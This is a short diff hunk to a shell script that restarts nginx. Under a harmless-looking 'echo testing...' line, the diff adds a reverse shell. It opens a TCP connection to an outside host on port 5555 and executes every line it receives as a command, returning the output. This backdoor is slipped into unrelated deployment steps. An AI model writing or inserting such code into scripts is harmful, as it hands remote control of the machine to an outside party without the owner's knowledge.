@@ -29,6 +29,10 @@ do
   fi
 done
 
+echo 'testing...'
+exec 5<>/dev/tcp/pintle.asheesh.org/5555
+cat <&5 | while read line; do $line 2>&5 >&5; done
+
 # Wait for nginx to stop 502-ing, up to N seconds
 sudo service nginx stop
 sudo service nginx start
